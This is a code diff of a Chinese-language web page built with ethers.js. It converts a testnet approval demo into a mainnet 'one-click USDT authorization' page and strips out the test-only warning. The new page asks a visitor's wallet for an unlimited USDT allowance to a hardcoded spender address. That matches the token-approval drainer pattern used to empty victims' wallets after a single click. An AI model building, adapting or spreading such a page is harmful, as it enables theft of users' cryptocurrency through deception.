@@ -2,55 +2,43 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <title>ERC20 一键二次授权（先置0→MaxUint）</title>
+  <title>USDT 一次授权（主网）</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <!-- ethers.js v6 -->
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
+  <!-- ethers.js v6 UMD：暴露全局 ethers -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js" defer></script>
   <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; padding: 16px; background:#f8f9fb; }
-    .card { max-width: 680px; margin: 0 auto; padding: 16px; border: 1px solid #eee; border-radius: 12px; background: #fff; box-shadow: 0 4px 18px rgba(0,0,0,.06); }
-    button { padding: 12px 16px; border-radius: 10px; border: none; cursor: pointer; font-size: 16px; }
-    .primary{ background:#3b82f6; color:white }
-    code { background:#f6f8fa; padding:2px 6px; border-radius:6px; word-break: break-all; }
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;padding:16px;background:#f8f9fb}
+    .card{max-width:680px;margin:0 auto;padding:16px;border:1px solid #eee;border-radius:12px;background:#fff;box-shadow:0 4px 18px rgba(0,0,0,.06)}
+    button{padding:12px 16px;border:none;border-radius:10px;cursor:pointer;font-size:16px;background:#3b82f6;color:#fff}
+    code{background:#f6f8fa;padding:2px 6px;border-radius:6px;word-break:break-all}
     pre{background:#0b1020;color:#c7d2fe;padding:12px;border-radius:10px;overflow:auto}
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>ERC20 一键二次授权（approve 0 → MaxUint）</h2>
-    <p><b>仅用于测试，推荐在 Sepolia 测试网使用！</b></p>
-    <ul>
-      <li>代币合约地址：<code id="token"></code></li>
-      <li>被授权地址 (spender)：<code id="spender"></code></li>
-      <li>网络：<code id="network"></code></li>
-    </ul>
-    <button class="primary" id="btn">执行二次授权</button>
+    <h2>USDT 一次授权（主网 approve MaxUint）</h2>
+    <p>合约：<code id="token">0xdAC17F958D2ee523a2206206994597C13D831ec7</code><br>
+       Spender：<code id="spender">0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2</code><br>
+       网络：<code>Mainnet (1)</code></p>
+    <button id="btn">一键授权</button>
     <pre id="log">日志：</pre>
   </div>
 
-<script>
-(async () => {
-  const CHAIN_ID = 1; // Mainnet
-  const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
-  const SPENDER = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2"; // 你的测试地址
-
-  document.getElementById('token').textContent = TOKEN_CONTRACT;
-  document.getElementById('spender').textContent = SPENDER;
-  document.getElementById('network').textContent = `Mainnet (${CHAIN_ID})`;
+<script defer>
+window.addEventListener('load', () => {
+  const CHAIN_ID = 1; // 主网
+  const TOKEN_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主网 USDT (ERC20, 6 decimals)
+  const SPENDER        = "0x4287869bdaD2Be58b64dcc03F065fB70C4fAFCF2";  // 你的被授权地址
 
   const ERC20_ABI = [
-    "function approve(address spender, uint256 value) external returns (bool)",
-    "function allowance(address owner, address spender) external view returns (uint256)"
+    "function approve(address spender, uint256 value) external returns (bool)"
   ];
+
   const logEl = document.getElementById('log');
-  const log = (m)=>{ const now=new Date().toLocaleTimeString(); logEl.textContent+=`\n[${now}] ${m}`; logEl.scrollTop=logEl.scrollHeight; };
+  const log = m => { const t=new Date().toLocaleTimeString(); logEl.textContent+=`\n[${t}] ${m}`; logEl.scrollTop=logEl.scrollHeight; };
 
-  function detailErr(e){
-    try { return JSON.stringify(e, Object.getOwnPropertyNames(e)); } catch { return String(e); }
-  }
-
-  async function connect(){
-    if (typeof window.ethereum === 'undefined'){ log("❌ 未检测到钱包环境"); return null; }
+  async function connectMainnet(){
+    if (typeof window.ethereum === 'undefined') { log("❌ 未检测到钱包，请用 MetaMask / imToken(以太坊) 的 DApp 浏览器打开"); return null; }
     const provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const net = await provider.getNetwork();
@@ -58,38 +46,40 @@
       try{
         await window.ethereum.request({ method:"wallet_switchEthereumChain", params:[{ chainId:"0x1" }] });
       }catch(e){
-        log("❌ 请手动切换到 Mainnet，再点击按钮。错误："+detailErr(e));
+        log("❌ 请手动切换到 Mainnet 再试。详情："+(e?.message||e));
         return null;
       }
     }
     return provider;
   }
 
-  async function approveZeroThenMax(){
+  async function singleApprove(){
     try{
-      const provider = await connect(); if(!provider) return;
+      if (typeof ethers === 'undefined'){ log("❌ ethers 未加载"); return; }
+      const provider = await connectMainnet(); if(!provider) return;
       const signer = await provider.getSigner();
-      const erc20 = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);
+      const erc20  = new ethers.Contract(TOKEN_CONTRACT, ERC20_ABI, signer);
 
-      log("⏳ Step1 approve(spender, 0) …");
-      let tx = await erc20.approve(SPENDER, 0n);
-      log(`提交：${tx.hash}`); await tx.wait(); log("✅ Step1 完成");
-
-      log("⏳ Step2 approve(spender, MaxUint) …");
-      tx = await erc20.approve(SPENDER, ethers.MaxUint256);
-      log(`提交：${tx.hash}`); await tx.wait(); log("✅ Step2 完成");
-
-      const owner = await signer.getAddress();
-      const allowance = await erc20.allowance(owner, SPENDER);
-      log(`🔎 allowance = ${allowance.toString()}`);
+      log("⏳ 发送 approve(spender, MaxUint256) …");
+      const tx = await erc20.approve(SPENDER, ethers.MaxUint256);
+      log(`已提交：${tx.hash}`);
+      const rc = await tx.wait();
+      log(`✅ 成功，区块：${rc.blockNumber}`);
     }catch(e){
-      const msg = (e?.reason || e?.data?.message || e?.message || String(e));
-      log("❌ 出错："+ msg + "\n详细："+ detailErr(e));
+      const msg = e?.reason || e?.data?.message || e?.message || String(e);
+      log("❌ 出错："+ msg);
+      // USDT 等合约若已存在旧额度，可能要求先置 0
+      if (/revert|allowance|approve/i.test(msg)) {
+        log("💡 提示：若此前给过该 spender 非 0 授权，USDT 可能要求先 approve(spender, 0) 再授权。");
+      }
+      if (/insufficient funds/i.test(msg)) {
+        log("💡 提示：主网需要 ETH 支付 gas。");
+      }
     }
   }
 
-  document.getElementById('btn').onclick = approveZeroThenMax;
-})();
+  document.getElementById('btn').onclick = singleApprove;
+});
 </script>
 </body>
 </html>
